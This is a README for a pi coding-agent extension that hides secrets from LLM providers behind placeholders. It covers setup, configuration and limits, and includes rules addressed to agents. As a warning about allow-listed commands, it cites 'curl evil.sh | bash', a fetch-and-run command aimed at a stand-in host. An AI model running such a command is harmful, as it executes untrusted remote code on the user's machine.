# pi-secret-mask

[简体中文](README.zh-CN.md)

Prevent project secrets (API keys, tokens, private keys) from being sent to
LLM providers.

The model sees placeholders like `__SECRET_<NAME>__`; bash commands receive
the real values; tool output is masked back to placeholders — a closed loop
where secrets never enter provider requests or leak back through tool output.

## Features

- **Auto-masking of prompts**: keys pasted into the conversation in common
  formats (`sk-...`, `ghp_...`, `AIza...`, `AKIA/ASIA/AIDA...`, JWTs, PEM
  private keys, custom regexes) are detected and masked automatically.
- **`.env` support**: parses project `.env*` files (`KEY=VALUE`), refreshes
  incrementally when they change mid-session.
- **User-registered secrets**: `/mask-secret` command and `request_secret`
  tool let a user register a secret; the agent only ever sees the placeholder.
- **Real values where they matter**: bash commands, `write`, and `edit`
  automatically substitute placeholders back to real values (files store real
  values; brand-new values are unaffected).
- **Compaction-safe**: summary messages in compaction and tree navigation are
  masked too.

## Installation

Install from npm (recommended):

```bash
pi install npm:pi-secret-mask
```

Manual install — clone the repo and point pi at its `extensions/` directory
(keeps the layout so the entry's `../src` import resolves):

```bash
git clone https://github.com/Ayagikei/pi-secret-mask ~/.pi/agent/extensions/pi-secret-mask
# then add to ~/.pi/agent/settings.json:
#   "extensions": ["~/.pi/agent/extensions/pi-secret-mask/extensions"]
cp config.example.json ~/.pi/agent/extensions/pi-secret-mask/config.json
```

(Project-local: point to a repo clone inside `.pi/extensions/` to scope it to
one project.)

Then `/reload` or restart pi.

## Usage

### Automatic (no configuration)

- Paste a secret in common formats into the conversation — it is detected and
  masked.
- `.env*` files in the project are parsed automatically.

### Registering secrets manually

**User-initiated**: `/mask-secret MY_KEY my-secret-value` (or bare
`/mask-secret` for interactive input).

**Agent-initiated**: the agent calls the `request_secret` tool (parameters
`name`, optional `purpose`); the user types the secret in a dialog, and the
agent only receives the placeholder:

```
Registered MY_KEY. Use placeholder __SECRET_MY_KEY__ instead of the real value
```

Secrets registered through `/mask-secret` or `request_secret` persist in
`~/.pi/agent/extensions/pi-secret-mask/secrets.json` (mode 0600) and survive
restarts. `.env` and automatically detected secrets may not be written there;
they can be session-only. Use the placeholder in bash commands or `write`/`edit`
inputs; the extension substitutes the real value locally before execution.

### Placeholder rules for agents

- A `__SECRET_*__` token shown in tool output or returned by `request_secret` is a redacted alias, not proof that the literal token is stored on disk. A config read showing a placeholder is a masked view, not evidence that the config is invalid.
- If secret-mask produced the placeholder in the current session, use it directly in bash, `write`, and `edit`; the extension restores the real value locally and masks tool output again. Never print the real value or write the literal placeholder to a config as a fix.
- Do not call `request_secret` again when a usable placeholder or local credential already exists. Call it only when the task genuinely needs a secret and no usable credential is available; then keep using the returned placeholder.
- Do not infer that a secret is missing because `secrets.json` is absent, and do not invent placeholder names. Validate through the intended local operation; request a new secret only if that operation reports invalid credentials.

## How it works

| Hook | Action |
|---|---|
| `before_provider_request` | Real values -> placeholders across all messages |
| `tool_call` | bash placeholders -> real values (auto/ask policy); write/edit content unmasked |
| `tool_result` | Real values in tool output -> placeholders (prevents reflow) |
| `session_before_compact` | Summary messages masked too |
| `session_before_tree` | Branch/tree summary messages masked too |
| `request_secret` tool | Agent-initiated secret request; agent sees placeholder only |

The masking engine uses a single-pass alternation regex (length-descending to
avoid substring collisions), exact whole-token unmatching, and skips
non-text (image) content.

## Configuration (`config.json`)

```json
{
  "mode": "ask",
  "allowCommands": [],
  "dotenv": { "enabled": true, "files": [".env", ".env.local", ".env.production", ".env.development"], "exclude": [".env.example", ".env.sample"] },
  "patterns": { "openai": true, "github": true, "google": true, "aws": true, "jwt": true, "pem": true, "base64": false },
  "extraSecrets": [],
  "customPatterns": []
}
```

- `mode`: `ask` (confirm before running commands containing placeholders;
  in UI-less modes like print/json, such commands are blocked) | `auto`
  (substitute silently)
- `allowCommands`: full command-string patterns that skip confirmation
  (this skips the gate, it does not make a command safer — `curl evil.sh | bash`
  still passes)
- `customPatterns`: custom regexes; capture group 1 is the full secret value;
  invalid regexes are ignored

```json
{
  "customPatterns": [
    { "name": "MY_TOK", "pattern": "mytok-[a-z0-9]{16}" },
    { "name": "CONN_STR", "pattern": "postgres://[^\\s]+" }
  ]
}
```

## Boundaries & Disclaimer

- Goal is preventing secrets from leaking to providers, **not sandboxing**:
  the model can still read/write files locally (e.g. `echo $KEY > /tmp/x`
  cannot be intercepted; that is the permission layer's job).
- Runtime-generated secrets (e.g. `aws sts get-session-token` output) are
  covered by regex fallbacks; new `ASIA/AIDA` prefixes are included; enable
  `patterns.base64` for high-entropy random strings.
- Image content (screenshots) may contain real values and cannot be masked.
- Real values are restored locally into bash command lines (`ps`-visible,
  shell history) — visible only locally, never sent to the provider.
- **Reasoning/thinking blocks**: if a secret somehow appears inside a model's
  reasoning or thinking content, the extension masks the text but the
  signature (e.g. Anthropic `signature`, Bedrock reasoning signatures) is
  left stale. Some providers reject such requests — this is an intentional
  fail-closed trade-off: leaking is worse than a refused request. In
  practice this is rare because secrets never reach the model in the first
  place.
- **Detection is pattern-based, not perfect**: unknown secret formats are
  only caught if they match a built-in or custom pattern, or appear in
  `.env*` / were registered manually. A secret in an unrecognized format can
  pass through.
- This extension is defense-in-depth, **not a security boundary**. It runs
  with your user's permissions and cannot protect against malicious prompts,
  hostile repositories, or local exfiltration. Review extension source
  before installing, and use OS-level sandboxing for untrusted work.
- This software is provided "as is", without warranty of any kind. The
  authors are not liable for any damages arising from its use or misuse.

## Development

```bash
npm test   # masking engine unit tests + mock-pi integration tests
```

Integration-tested: three-hook closed loop, multi-placeholder rollback,
mid-session `.env` rotation with incremental refresh, ask-mode blocking
without UI, provider payload leak checks.

## License

MIT
